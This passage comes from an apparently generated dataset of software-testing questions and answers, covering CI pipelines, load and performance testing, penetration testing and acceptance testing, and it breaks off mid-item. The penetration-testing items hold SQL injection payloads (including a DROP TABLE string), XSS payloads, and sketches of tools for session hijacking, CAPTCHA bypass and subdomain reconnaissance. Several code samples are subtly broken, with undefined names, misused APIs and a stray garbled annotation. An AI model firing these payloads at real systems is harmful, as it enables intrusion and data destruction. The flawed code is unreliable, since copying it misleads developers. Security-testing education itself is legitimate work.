dependencies.\n```java\nimport com.github.tomakehurst.wiremock.WireMockServer;\nimport com.github.tomakehurst.wiremock.client.WireMock;\nimport org.junit.jupiter.api.AfterEach;\nimport org.junit.jupiter.api.BeforeEach;\nimport org.junit.jupiter.api.Test;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.test.context.SpringBootTest;\nimport org.springframework.cloud.netflix.ribbon.RibbonClient;\nimport org.springframework.cloud.netflix.ribbon.RibbonClients;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.web.reactive.function.client.WebClient;\n\nimport static com.github.tomakehurst.wiremock.client.WireMock.*;\n\n@SpringBootTest\n@RibbonClients(defaultConfiguration = RibbonClientConfiguration.class)\npublic class Service1IntegrationTest {\n\n    private WireMockServer wireMockServer;\n\n    @Autowired\n    private WebClient webClient;\n\n    @BeforeEach\n    public void setup() {\n        wireMockServer = new WireMockServer(8083);\n        wireMockServer.start();\n        WireMock.configureFor(\"localhost\", wireMockServer.port());\n    }\n\n    @AfterEach\n    public void teardown() {\n        wireMockServer.stop();\n    }\n\n    @Test\n    public void testService1WithDelayedResponse() {\n        stubFor(get(urlEqualTo(\"/service2\"))\n                .willReturn(aResponse()\n                        .withStatus(HttpStatus.OK.value())\n                        .withFixedDelay(5000)));\n\n        // Test the service1's response with simulated latency\n        //...\n    }\n\n    // Other test cases for service1\n}\n```\n1. Use Gatling to perform load testing and simulate service outages, capacity limits, and latency spikes.\n```scala\nimport io.gatling.core.Predef._\nimport io.gatling.http.Predef._\n\nclass MicroservicesIntegrationTest extends Simulation {\n\n  val httpProtocol = http\n    .baseURL(\"http://localhost:80\") // Load Balancer\n    .acceptHeader(\"application/json\")\n    .doNotTrackHeader(\"1\")\n    .acceptLanguageHeader(\"en-US,en;q=0.5\")\n    .userAgentHeader(\"Mozilla/5.0\")\n\n  val users = scenario(\"Microservices Load Test\")\n    .exec(http(\"Request_1\").get(\"/service1\"))\n    .pause(1, 5) // Introduce random latency\n    .exec(http(\"Request_2\").get(\"/service2\"))\n    .pause(5) // Simulate service2 outage\n    .exec(http(\"Request_3\").get(\"/service1\"))\n\n  setUp(\n    users.inject(atOnceUsers(1000))\n  ).protocols(httpProtocol)\n}\n```\nIn this example, we have created an environment with Docker Compose, used JUnit and WireMock for testing individual service interactions with mocked dependencies, and Gatling for load testing and simulating various failure scenarios. This setup allows us to test the system's resilience, performance, and data consistency under different conditions."}, {"L2_TASK": "Testing", "L3_TASK": "Continuous testing practices", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: Develop a continuous testing pipeline for a Node.js application that integrates unit tests and integration tests. The pipeline should automatically run tests upon code changes and notify the development team of any failures.\n\nSolution:\nConcept: Continuous Integration (CI)\n\nHere's an example using GitHub Actions and the Jest testing framework to set up a continuous testing pipeline for a Node.js application:\n\n1. First, install Jest and create a `package.json` file if you don't have one already:\n```sh\nnpm init -y\nnpm install jest --save-dev\n```\n1. Create a `src` folder for your application code and a `tests` folder for your tests. Write a simple unit test (e.g., `src/index.js` and `tests/index.test.js`):\n```javascript\n// src/index.js\nexport function add(a, b) {\n  return a + b;\n}\n```\n```javascript\n// tests/index.test.js\nimport { add } from '../src/index';\n\ndescribe('add function', () => {\n  it('adds two numbers correctly', () => {\n    expect(add(2, 3)).toBe(5);\n  });\n});\n```\n1. Create a `jest.config.js` file in the root directory to configure Jest:\n```javascript\nmodule.exports = {\n  roots: ['<rootDir>/src', '<rootDir>/tests'],\n  moduleFileExtensions: ['js', 'json', 'ts'],\n  testEnvironment: 'node',\n};\n```\n1. Create a `.github/workflows/test.yml` file to define the GitHub Actions workflow:\n```yaml\nname: CI\n\non:\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    strategy:\n      matrix:\n        node-version: [14.x, 16.x, 18.x]\n\n    steps:\n    - uses: actions/checkout@v2\n    - name: Use Node.js ${{ matrix.node-version }}\n      uses: actions/setup-node@v2\n      with:\n        node-version: ${{ matrix.node-version }}\n    - run: npm ci\n    - run: npm test\n      env:\n        CI: true\n    - name: Notify on Test Failure\n      if: failure()\n      uses: actions/github-script@v6\n      with:\n        script: |\n          const body = 'There are test failures. Please review the logs.';\n          github.rest.issues.createComment({\n            issue_number: context.issue.number,\n            owner: context.repo.owner,\n            repo: context.repo.repo,\n            body,\n          });\n```\nThis workflow runs on every push to the `main` branch and every pull request. It installs dependencies, runs Jest tests, and upon failure, comments on the pull request with a notification.\n\nQuestion 2:\nProblem: Implement a continuous testing strategy for a Python Flask application that includes both unit tests and functional tests. The tests should run automatically after each commit, and the pipeline should report test results and code coverage.\n\nSolution:\nConcept: Continuous Integration (CI)\n\nHere's an example using GitLab CI/CD and the pytest testing framework for a Python Flask application:\n\n1. First, install the necessary packages (pytest, pytest-cov, and Flask) in your `requirements.txt` file:\n```\nFlask\npytest\npytest-cov\n```\n1. Create a `tests` folder with a simple unit test and functional test:\n```python\n# tests/test_app.py\nfrom app import app\nimport unittest\n\n\nclass TestApp(unittest.TestCase):\n    def setUp(self):\n        self.app = app.test_client()\n\n    def test_homepage(self):\n        response = self.app.get('/')\n        self.assertEqual(response.status_code, 200)\n        self.assertIn(b'Hello, World!', response.data)\n\n    def test_calculator_endpoint(self):\n        response = self.app.get('/calculator/2+3')\n        self.assertEqual(response.status_code, 200)\n        self.assertIn(b'5', response.data)\n```\nMake sure you have a functional endpoint in your Flask app:\n```python\n# app.py\nfrom flask import Flask\napp = Flask(__name__)\n\n@app.route('/')\ndef home():\n    return 'Hello, World!'\n\n@app.route('/calculator/<expression>')\ndef calculator(expression):\n    import ast\n    result = ast.literal_eval(expression)\n    return str(result)\n```\n1. Create a `.gitlab-ci.yml` file in the root directory to define the GitLab CI/CD pipeline:\n```yaml\nimage: python:3.9\n\nstages:\n  - test\n  - coverage\n\ntest:\n  stage: test\n  script:\n    - pip install -r requirements.txt\n    - pytest\n\ncoverage:\n  stage: coverage\n  script:\n    - pip install -r requirements.txt\n    - pytest --cov=app --cov-report=xml\n  artifacts:\n    paths:\n      - coverage.xml\n  only:\n    - master\n```\nThis pipeline consists of two stages: `test` and `coverage`. The `test` stage runs the tests, and the `coverage` stage calculates the code coverage and saves the results in an XML file. By default, GitLab provides code coverage reporting for Python projects.\n\nRemember to replace `app` with the name of your main application module in the `pytest --cov=app` command."}, {"L2_TASK": "Testing", "L3_TASK": "Continuous testing practices", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nGenerate a problem related to Continuous Testing in a microservices architecture, where you need to implement a distributed, asynchronous test orchestration system that ensures all microservices are tested in isolation, with mock data, and in a rolling manner without impacting the production environment. The system should also analyze test results and provide detailed reports to the development team.\n\nConcept: Continuous Testing, Microservices, Asynchronous Communication, Mock Data, Test Orchestration\n\nSolution:\nCreate a Python-based test orchestration system using `Flask`, `RabbitMQ`, and `Docker` to handle the distributed and asynchronous nature of testing microservices. Use `pytest` for testing and `moto` for creating mock data.\n\n```python\n# test_orchestrator.py\nfrom flask import Flask, json\nimport pika\nimport docker\nfrom subprocess import Popen, PIPE\n\napp = Flask(__name__)\nconnection = pika.BlockingConnection(pika.ConnectionParameters('localhost'))\nchannel = connection.channel()\nchannel.queue_declare(queue='test_queue')\n\ndef run_service_test(service, mock_data):\n    client = docker.from_env()\n    # Start a container with the microservice and mock data\n    container = client.containers.run(service, 'pytest -v --mock-data {}'.format(mock_data), detach=True)\n    logs, _ = container.logs(stream=True, stdout=True, stderr=True)\n    test_result = logs.decode('utf-8').strip()\n    container.remove()\n    return test_result\n\n@app.route('/start_test', methods=['POST'])\ndef start_test():\n    data = json.loads(request.data)\n    service = data['service']\n    mock_data = data['mock_data']\n\n    channel.basic_publish(exchange='',\n                          routing_key='test_queue',\n                          body=json.dumps({'service': service, 'mock_data': mock_data}))\n\n    return 'Test execution initiated'\n\ndef consume_test_queue():\n    channel.basic_qos(prefetch_count=1)\n    channel.basic_consume(queue='test_queue',\n                          on_message_callback=lambda ch, method, props, body: run_service_test(**json.loads(body)),\n                          auto_ack=True)\n\n    print(' [*] Waiting for messages. To exit press CTRL+C')\n    channel.start_consuming()\n\nif __name__ == '__main__':\n    Popen(['rabbitmq-server'], shell=True)  # Start RabbitMQ server\n    consume_test_queue()\n    app.run(host='0.0.0.0', port=5000)\n```\n\nThis solution sets up a Flask API to receive requests for starting tests, pushes the requests to a RabbitMQ queue, and has a consumer to process these requests asynchronously. Docker is used to spin up microservice containers with mock data and execute tests.\n\nQuestion 2:\nDesign a complex problem related to Continuous Testing where you need to implement an intelligent test prioritization mechanism that dynamically prioritizes tests based on code changes, historical test failures, and the criticality of the modified functionality. The system should also adapt to changes in the codebase and update the prioritization accordingly.\n\nConcept: Continuous Testing, Test Prioritization, Code Analysis, Machine Learning\n\nSolution:\nUse a Python-based solution with `gitpython` for code change analysis, `pandas` for data manipulation, and `scikit-learn` for machine learning model to prioritize tests. Create a custom script that integrates with a CI/CD pipeline.\n\n```python\n# test_priority.py\nimport git\nimport pandas as pd\nimport numpy as np\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.linear_model import LogisticRegression\nfrom sklearn.model_selection import train_test_split\n\ndef analyze_code_changes(repo_path, commit_range):\n    repo = git.Repo(repo_path)\n    commits = repo.iter_commits(commit_range)\n    changes = []\n    for commit in commits:\n        for diff in commit.diff(commit.parents[0]):\n            changes.append({\n                'file_path': diff.b_path,\n                'lines_changed': diff.diff.stats.total\n            })\n    return pd.DataFrame(changes)\n\ndef load_test_results(results_file):\n    return pd.read_csv(results_file)\n\ndef calculate_test_importance(test_results, code_changes, top_n):\n    joined_data = test_results.merge(code_changes, left_on='file_path', right_on='file_path', how='outer')\n    joined_data['importance'] = joined_data['lines_changed'].fillna(0)\n    tfidf = TfidfVectorizer(stop_words='english')\n    test_names = tfidf.fit_transform(joined_data['file_path'])\n    features = np.hstack([test_names.toarray(), joined_data[['importance']].values])\n\n    X = features\n    y = test_results['outcome'].map({'PASS': 0, 'FAIL': 1})\n    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)\n\n    model = LogisticRegression()\n    model.fit(X_train, y_train)\n    test_importances = model.coef_[0]\n    \n    return sorted(zip(test_results['test_name'].values, test_importances), key=lambda x: -x[1])[:top_n]\n\ndef update_test_priority(repo_path, commit_range, results_file, output_file, top_n=10):\n    code_changes = analyze_code_changes(repo_path, commit_range)\n    test_results = load_test_results(results_file)\n    prioritized_tests = calculate_test_importance(test_results, code_changes, top_n)\n    prioritized_tests_df = pd.DataFrame(prioritized_tests, columns=['test_name', 'importance'])\n    prioritized_tests_df.to_csv(output_file, index=False)\n\n# Usage\nupdate_test_priority('/path/to/repo', 'HEAD~10..HEAD', 'test_results.csv', 'test_priority.csv')\n```\n\nThis solution analyzes code changes, merges them with historical test results, and uses a machine learning model to prioritize tests based on the importance score. The model can adapt to changes in the codebase by retraining with new commits and results."}, {"L2_TASK": "Testing", "L3_TASK": "Load and performance testing", "Complexity_Level": "medium", "Response": "Question 1:\nConcept: Load Testing\n\nProblem: You have developed a web application that handles user requests, but you need to ensure it can handle a high number of concurrent users without performance degradation. Write a medium complexity script in Python using the `locust` library to perform load testing on the application's login endpoint.\n\nSolution:\n```python\nfrom locust import HttpUser, task, between\n\nclass LoginUser(HttpUser):\n    wait_time = between(5, 15)\n\n    @task\n    def load_test_login(self):\n        self.client.post(\"/api/login\", {\n            \"username\": \"testuser\",\n            \"password\": \"testpassword\"\n        })\n```\nExplanation: The script creates a `LoginUser` class that inherits from `HttpUser` provided by the `locust` library. The `wait_time` attribute defines a random waiting time between 5 and 15 seconds between each user action. The `load_test_login` task simulates a user logging in by sending a POST request to the `/api/login` endpoint with a sample user payload.\n\nTo run the load test, you would install `locust` (`pip install locust`) and execute it with the appropriate command, specifying the number of concurrent users and the runtime.\n\nQuestion 2:\nConcept: Performance Testing\n\nProblem: You need to test the response time of a REST API that retrieves user data from a database. Write a medium complexity JMeter script in XML to measure the average response time for 1000 requests to the `/api/users` endpoint.\n\nSolution:\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<jmeterTestPlan version=\"1.2\" properties=\"5.0\" jmeter=\"5.4.1\">\n  <hashTree>\n    <TestPlan guiclass=\"TestPlanGui\" testclass=\"TestPlan\" testname=\"Test Plan\" enabled=\"true\">\n      <stringProp name=\"TestPlan.comments\"></stringProp>\n      <boolProp name=\"TestPlan.functional_mode\">false</boolProp>\n      <boolProp name=\"TestPlan.serialize_threadgroups\">false</boolProp>\n      <elementProp name=\"TestPlan.user_defined_variables\" elementType=\"Arguments\" guiclass=\"ArgumentsPanel\" testclass=\"Arguments\" testname=\"User Defined Variables\" enabled=\"true\">\n        <collectionProp name=\"Arguments.arguments\"/>\n      </elementProp>\n      <stringProp name=\"TestPlan.user_define_classpath\"></stringProp>\n    </TestPlan>\n    <hashTree>\n      <ThreadGroup guiclass=\"ThreadGroupGui\" testclass=\"ThreadGroup\" testname=\"Thread Group\" enabled=\"true\">\n        <stringProp name=\"ThreadGroup.on_sample_error\">continue</stringProp>\n        <elementProp name=\"ThreadGroup.main_controller\" elementType=\"LoopController\" guiclass=\"LoopControlPanel\" testclass=\"LoopController\" testname=\"Loop Controller\" enabled=\"true\">\n          <boolProp name=\"LoopController.continue_forever\">false</boolProp>\n          <stringProp name=\"LoopController.loops\">1000</stringProp>\n        </elementProp>\n        <stringProp name=\"ThreadGroup.num_threads\">10</stringProp>\n        <stringProp name=\"ThreadGroup.ramp_time\">1</stringProp>\n        <boolProp name=\"ThreadGroup.scheduler\">false</boolProp>\n        <stringProp name=\"ThreadGroup.duration\"></stringProp>\n        <stringProp name=\"ThreadGroup.delay\"></stringProp>\n      </ThreadGroup>\n      <hashTree>\n        <HTTPSamplerProxy guiclass=\"HttpTestSampleGui\" testclass=\"HTTPSamplerProxy\" testname=\"GET /api/users\" enabled=\"true\">\n          <stringProp name=\"HTTPSampler.domain\">your-api-domain.com</stringProp>\n          <stringProp name=\"HTTPSampler.port\"></stringProp>\n          <stringProp name=\"HTTPSampler.protocol\">https</stringProp>\n          <stringProp name=\"HTTPSampler.contentEncoding\">UTF-8</stringProp>\n          <stringProp name=\"HTTPSampler.path\">/api/users</stringProp>\n          <stringProp name=\"HTTPSampler.method\">GET</stringProp>\n          <boolProp name=\"HTTPSampler.follow_redirects\">true</boolProp>\n          <boolProp name=\"HTTPSampler.auto_redirects\">false</boolProp>\n          <boolProp name=\"HTTPSampler.use_keepalive\">true</boolProp>\n          <boolProp name=\"HTTPSampler.DO_MULTIPART_POST\">false</boolProp>\n          <stringProp name=\"HTTPSampler.implementation\">Java</stringProp>\n          <stringProp name=\"HTTPSampler.connect_timeout\"></stringProp>\n          <stringProp name=\"HTTPSampler.response_timeout\"></stringProp>\n        </HTTPSamplerProxy>\n        <hashTree>\n          <ResultCollector guiclass=\"GraphResults\" testclass=\"ResultCollector\" testname=\"Response Time Graph\" enabled=\"true\">\n            <boolProp name=\"ResultCollector.error_logging\">false</boolProp>\n            <objProp>\n              <name>saveConfig</name>\n              <value class=\"SampleSaveConfiguration\">\n                <time>true</time>\n                <latency>true</latency>\n                <timestamp>true</timestamp>\n                <success>true</success>\n                <label>true</label>\n                <code>true</code>\n                <message>true</message>\n                <threadName>true</threadName>\n                <dataType>true</dataType>\n                <encoding>false</encoding>\n                <assertions>true</assertions>\n                <subresults>true</subresults>\n                <responseData>false</responseData>\n                <samplerData>false</samplerData>\n                <xml>false</xml>\n                <fieldNames>true</fieldNames>\n                <responseHeaders>false</responseHeaders>\n                <requestHeaders>false</requestHeaders>\n                <responseDataOnError>false</responseDataOnError>\n                <saveAssertionResultsFailureMessage>true</saveAssertionResultsFailureMessage>\n                <assertionsResultsToSave>0</assertionsResultsToSave>\n                <bytes>true</bytes>\n                <sentBytes>true</sentBytes>\n                <threadCounts>true</threadCounts>\n                <idleTime>true</idleTime>\n                <connectTime>true</connectTime>\n              </value>\n            </objProp>\n            <stringProp name=\"filename\"></stringProp>\n          </ResultCollector>\n          <hashTree/>\n        </hashTree>\n      </hashTree>\n    </hashTree>\n  </hashTree>\n</jmeterTestPlan>\n```\nExplanation: This JMeter XML script defines a `ThreadGroup` with 10 threads that will execute the GET request to `/api/users` 1000 times (100 requests per thread). The `Response Time Graph` listener is added to visualize the response times. To run the test, you would import this XML into JMeter and execute the test plan. After completion, you can analyze the response time graph to measure performance."}, {"L2_TASK": "Testing", "L3_TASK": "Load and performance testing", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a highly scalable distributed load testing framework to simulate a realistic million-user scenario for a real-time streaming application. The framework should dynamically allocate resources, handle data sharding, and ensure load distribution across various server clusters.\n\nConcept: Distributed Testing\n\nSolution:\n```python\nimport threading\nimport random\nimport time\nfrom kazoo.client import KazooClient\nfrom load_generator import generate_load\n\n# Connect to ZooKeeper for cluster management\nzk = KazooClient(hosts='zk_server1:2181,zk_server2:2181,zk_server3:2181')\nzk.start()\n\n# Get server clusters from ZooKeeper\nclusters = zk.get_children(\"/clusters\")\n\ndef distribute_load(cluster):\n    while True:\n        target_server = random.choice(zk.get(\"/clusters/\" + cluster)[0].split(','))\n        load = generate_load(1000)  # Generate load for 1000 simulated users\n        send_request(target_server, load)\n        time.sleep(random.randint(100, 200) / 100)  # Random delay between requests\n\n# Start load threads for each cluster\nload_threads = []\nfor cluster in clusters:\n    t = threading.Thread(target=distribute_load, args=(cluster,))\n    t.start()\n    load_threads.append(t)\n\n# Monitor and rebalance load\nwhile True:\n    cluster_stats = {}\n    for cluster in clusters:\n        cluster_stats[cluster] = zk.get(\"/clusters/\" + cluster)[1].count(',')\n    \n    # Reallocate resources if needed (example logic)\n    for cluster in clusters:\n        if cluster_stats[cluster] < average_cluster_users:\n            new_server = allocate_new_server()\n            zk.create(\"/clusters/\" + cluster + \"/\" + new_server)\n            print(f\"Added server {new_server} to cluster {cluster}\")\n\n    time.sleep(60)  # Check for rebalancing every minute\n\n# Helper functions\ndef allocate_new_server():\n    # Implement logic to provision a new server and return its IP\n    pass\n\ndef send_request(server, load):\n    # Implement logic to send the load to the server (e.g., HTTP requests)\n    pass\n\n# Terminate threads when done\nfor t in load_threads:\n    t.join()\n\nzk.stop()\n```\nQuestion 2: Create a custom load testing tool to analyze the performance of a distributed cache system under heavy load. The tool should generate complex data access patterns, measure response times, and detect cache inconsistencies across multiple nodes.\n\nConcept: Load Testing with Cache Systems\n\nSolution:\n```python\nimport requests\nimport threading\nimport time\nimport random\nfrom cache_simulator import simulate_cache_access\nfrom cache_inconsistency_detector import detect_inconsistencies\n\n# Define cache nodes\nnodes = [\"http://node1:5000\", \"http://node2:5000\", \"http://node3:5000\"]\n\ndef generate_requests(node):\n    while True:\n        key = str(random.randint(1, 1000000))\n        should_write = random.random() < 0.1\n        response_time, cache_status = simulate_cache_access(node, key, should_write)\n        record_response_time(response_time, cache_status)\n\n        if should_write:\n            detect_inconsistencies(nodes, key)\n\n        time.sleep(random.randint(1, 100) / 100)  # Random delay between requests\n\n# Start request threads for each cache node\nrequest_threads = []\nfor node in nodes:\n    t = threading.Thread(target=generate_requests, args=(node,))\n    t.start()\n    request_threads.append(t)\n\n# Monitor and analyze results\nwhile True:\n    analyze_response_times()\n    detect_inconsistencies_all_nodes()\n    time.sleep(60)  # Analyze every minute\n\n# Helper functions\ndef record_response_time(response_time, cache_status):\n    # Implement logic to record response time and cache status\n    pass\n\ndef analyze_response_times():\n    # Implement logic to analyze response times and detect performance issues\n    pass\n\ndef detect_inconsistencies_all_nodes():\n    # Implement logic to detect inconsistencies across all cache nodes\n    pass\n```\nIn both solutions, you'll need to implement the helper functions to fit your specific use case and the cache or streaming application you're testing. These functions are placeholders for actual implementation details specific to the application being tested."}, {"L2_TASK": "Testing", "L3_TASK": "Security penetration testing", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: As a security expert, you are tasked with designing a medium complexity penetration test for a web application that involves checking for SQL injection vulnerabilities. Write a Python script using the `requests` library to craft and send a series of malicious SQL queries through an application's search input to detect potential SQL injection weaknesses.\n\nSolution:\n```python\nimport requests\n\n# Define the base URL and the vulnerable parameter\nbase_url = \"http://example.com/search\"\nvulnerable_param = \"q\"\n\n# Function to craft and send SQL injection payloads\ndef test_sql_injection(payload):\n    url = f\"{base_url}?{vulnerable_param}={payload}\"\n    response = requests.get(url)\n    return response.text\n\n# List of SQL injection payloads\npayloads = [\n    \"' OR 1=1 --\",\n    \"'; DROP TABLE users; --\",\n    \"'; SELECT * FROM users WHERE id=1 --\",\n    \"1' AND 1=1 UNION ALL SELECT * FROM users --\",\n    \"1' AND 'a' = 'a\",\n]\n\n# Perform the penetration test\nfor payload in payloads:\n    result = test_sql_injection(payload)\n    if \"error\" in result.lower() or \"warning\" in result.lower():\n        print(f\"Potential SQL injection found with payload: {payload}\")\n    else:\n        print(f\"No SQL injection detected with payload: {payload}\")\n```\nConcept: Penetration Testing\n\nQuestion 2:\nProblem: Design a JavaScript function to fuzz test a server API endpoint for potential cross-site scripting (XSS) vulnerabilities by sending a variety of encoded payloads. The function should send a POST request with a crafted `username` input to a specified endpoint.\n\nSolution:\n```javascript\nconst axios = require('axios');\n\n// Function to fuzz test for XSS vulnerabilities\nasync function testXSSVulnerability(payload) {\n  try {\n    const response = await axios.post(\n      'http://example.com/api/login',\n      {\n        username: payload,\n      },\n      {\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      }\n    );\n    if (response.data.includes('<script>') || response.data.includes('//')) {\n      console.log(`Potential XSS vulnerability detected with payload: ${payload}`);\n    } else {\n      console.log(`No XSS vulnerability detected with payload: ${payload}`);\n    }\n  } catch (error) {\n    console.error(`Error testing payload: ${payload}`, error.message);\n  }\n}\n\n// XSS payloads\nconst payloads = [\n  '<script>alert(\"XSS\")</script>',\n  '<img src=1 onerror=\"alert()\">',\n  '<svg/onload=alert()>',\n  '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',\n  '%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E',\n];\n\n// Perform the fuzz testing\npayloads.forEach((payload) => testXSSVulnerability(payload));\n```\nConcept: Penetration Testing"}, {"L2_TASK": "Testing", "L3_TASK": "Security penetration testing", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a sophisticated penetration testing tool that performs a multi-stage attack on a web application's login system, exploiting common vulnerabilities such as SQL injection, cross-site scripting (XSS), and session hijacking. The tool should be able to bypass CAPTCHA challenges and dynamically adapt its payload based on the target's response.\n\nConcept: Security Penetration Testing\n\nSolution:\n```python\nimport requests\nimport re\nfrom bs4 import BeautifulSoup\nimport random\nimport time\nfrom fake_useragent import UserAgent\n\n# Stage 1: SQL Injection\ndef sql_injection(url, payload):\n    response = requests.get(url + payload, headers={'User-Agent': UserAgent().random})\n    soup = BeautifulSoup(response.text, 'html.parser')\n    if 'admin' in soup.text.lower():\n        print(\"SQL Injection successful\")\n\n# Stage 2: XSS Attack\ndef xss_attack(url, payload):\n    payload = \"' onmouseover=alert('XSS')>\"\n    response = requests.get(url + payload, headers={'User-Agent': UserAgent().random})\n    soup = BeautifulSoup(response.text, 'html.parser')\n    if payload in str(soup):\n        print(\"XSS Attack successful\")\n\n# Stage 3: Session Hijacking - Fingerprinting (simplified)\ndef session_fingerprint(url):\n    response = requests.get(url, headers={'User-Agent': UserAgent().random})\n    soup = BeautifulSoup(response.text, 'html.parser')\n    fingerprint = soup.find(\"input\", attrs={\"name\": \"session_id\"})\n    return fingerprint['value'] if fingerprint else None\n\n# Stage 4: Bypass CAPTCHA\ndef bypass_captcha(url):\n    # AI-based solution, simplified for demonstration\n    time.sleep(random.randint(10, 20))  # mimic human delay\n    return \"captcha_solved\"\n\n# Stage 5: Adaptative payload generation\ndef adaptive_payload(url, stage, target_response):\n    if stage == 'sql':\n        payload = \"'; SELECT * FROM users WHERE username = 'admin'\"\n    elif stage == 'xss':\n        payload = \"' onmouseover=alert('XSS')\"\n    else:\n        return None\n    return payload\n\ndef penetration_test(url):\n    stages = ['sql', 'xss']\n    for stage in stages:\n        payload = adaptive_payload(url, stage, '')\n        if stage == 'sql':\n            sql_injection(url, payload)\n        elif stage == 'xss':\n            xss_attack(url, payload)\n        # Implement session hijacking and CAPTCHA bypass using the generated payload\n        session_id = session_fingerprint(url)\n        if session_id:\n            # Perform session hijacking with the captured session ID\n            pass\n        captcha_solution = bypass_captcha(url)\n        if captcha_solution:\n            # Use captcha_solution to submit the payload\n            pass\n\n# Example usage\npenetration_test(\"https://target.com/login\")\n```\nNote: This code is for demonstration purposes only and should never be used to attack real systems without explicit permission. It's essential to follow ethical guidelines in penetration testing.\n\nQuestion 2: Design a penetration testing tool that performs a reconnaissance attack to discover hidden subdomains and vulnerabilities in a target organization's network infrastructure. The tool should use DNS enumeration, passive information gathering, and web scraping to create a detailed map of the target's online assets.\n\nConcept: Security Penetration Testing\n\nSolution:\n```python\nimport dns.resolver\nimport requests\nfrom bs4 import BeautifulSoup\n\n# Stage 1: DNS Enumeration\ndef dns_enumeration(domain):\n    resolver = dns.resolver.Resolver()\n    resolver.nameservers = ['8.8.8.8']  # Use Google's DNS server\n    answers = resolver.resolve(domain, 'CNAME')\n    subdomains = [record.to_text().split('.')[0] for record in answers]\n    return subdomains\n\n# Stage 2: Passive Information Gathering\ndef passive_info_gathering(subdomains):\n    for subdomain in subdomains:\n        try:\n            response = requests.get(f'https://{subdomain}.{domain}', headers={'User-Agent': UserAgent().random})\n            if response.status_code == 200:\n                soup = BeautifulSoup(response.text, 'html.parser')\n                print(f\"Discovered: {subdomain}.{domain}\")\n                # Extract additional info like technologies, version numbers, etc.\n        except requests.exceptions.RequestException:\n            pass\n\n# Stage 3: Web Scraping for Vulnerabilities\ndef web_scraping(subdomains):\n    for subdomain in subdomains:\n        url = f'https://{subdomain}.{domain}'\n        try:\n            response = requests.get(url, headers={'User-Agent': UserAgent().random})\n            if response.status_code == 200:\n                soup = BeautifulSoup(response.text, 'html.parser')\n                # Check for known vulnerability patterns, CVE IDs, etc.\n                # Example: search for a specific text indicating a known vulnerability\n                if 'vulnerable_text' in str(soup):\n                    print(f\"Vulnerability found in {subdomain}.{domain}\")\n        except requests.exceptions.RequestException:\n            pass\n\ndef reconnaissance_attack(domain):\n    subdomains = dns_enumeration(domain)\n    passive_info_gathering(subdomains)\n    web_scraping(subdomains)\n\n# Example usage\nreconnaissance_attack(\"example.com\")\n```\nNote: This code is for educational purposes only and should be used responsibly, respecting privacy and ethical guidelines. Always obtain permission before performing reconnaissance on any network."}, {"L2_TASK": "Testing", "L3_TASK": "User acceptance testing", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: A web application has a user registration form, and you need to ensure that the registration process works as expected. The application uses React for frontend and Express for backend. Write a medium complexity test scenario for user acceptance testing, specifically checking if a user can successfully register with a unique email address and the password meets the minimum requirements.\n\nSolution:\nConcept: Frontend Testing, Backend Testing\n\n```jsx\n// Frontend (React Testing Library)\nimport React from 'react';\nimport { render, fireEvent } from '@testing-library/react';\nimport { registerForm } from './registerForm'; // Assume this is the component to test\n\ndescribe('Register Form (Frontend)', () => {\n  it('should submit the form successfully with valid inputs', async () => {\n    const { getByLabelText, getByText } = render(<registerForm />);\n    const emailInput = getByLabelText('Email');\n    const passwordInput = getByLabelText('Password');\n    const submitButton = getByText('Register');\n\n    fireEvent.change(emailInput, { target: { value: 'testuser@example.com' } });\n    fireEvent.change(passwordInput, { target: { value: 'SecureP@ss123' } });\n\n    fireEvent.click(submitButton);\n\n    // Mock API response\n    expect(fetch).toHaveBeenCalledWith('http://localhost/register', {\n      method: 'POST',\n      body: JSON.stringify({ email: 'testuser@example.com', password: 'SecureP@ss123' }),\n      headers: { 'Content-Type': 'application/json' },\n    });\n\n    // Assuming a success message is displayed on successful registration\n    expect(screen.getByText('Registration successful!')).toBeInTheDocument();\n  });\n});\n\n// Backend (Express and Jest)\nimport request from 'supertest';\nimport app from '../server'; // Assume this is the Express app\n\ndescribe('User Registration (Backend)', () => {\n  it('should create a new user with a unique email and valid password', async () => {\n    await request(app)\n      .post('/register')\n      .send({ email: 'testuser@example.com', password: 'SecureP@ss123' })\n      .expect(200)\n      .then(response => {\n        expect(response.body.status).toBe('success');\n        expect(response.body.message).toBe('User registered successfully');\n      });\n\n    // Mock the database save function to check if the user was saved\n    expect(UserModel.create).toHaveBeenCalledWith({ email: 'testuser@example.com', password: 'SecureP@ss123' });\n  });\n});\n```\n\nQuestion 2:\nProblem: An Android app allows users to purchase in-app products. The app is developed using Kotlin and uses the Google Play Billing Library to handle in-app billing. Create a medium complexity test scenario for user acceptance testing to verify the purchase flow, ensuring that a successful purchase is recorded and the product is unlocked.\n\nSolution:\nConcept: Mobile Development, Android Testing\n\n```kotlin\nimport androidx.test.ext.junit.runners.AndroidJUnit4\nimport androidx.test.filters.MediumTest\nimport androidx.test.platform.app.InstrumentationRegistry\nimport androidx.test.uiautomator.UiDevice\nimport com.example.yourapp.R\nimport com.example.yourapp.util.MockBillingService\nimport org.junit.After\nimport org.junit.Before\nimport org.junit.Test\nimport org.junit.runner.RunWith\n\n@\u4ecb\u8d28\u6d4b\u8bd5\n@RunWith(AndroidJUnit4::class)\nclass InAppPurchaseTest {\n\n    private lateinit var device: UiDevice\n\n    @Before\n    fun setup() {\n        device = UiDevice.getInstance(InstrumentationRegistry.getInstrumentation())\n        MockBillingService.startMockBillingService(device) // Mock in-app billing for testing\n    }\n\n    @After\n    fun tearDown() {\n        MockBillingService.stopMockBillingService(device)\n    }\n\n    @Test\n    fun testInAppPurchaseFlow() {\n        // Assuming the app has a purchase button\n        val purchaseButton = device.findObject(UiSelector().resourceId(R.id.btn_purchase))\n        purchaseButton.click()\n\n        // Simulate successful purchase response\n        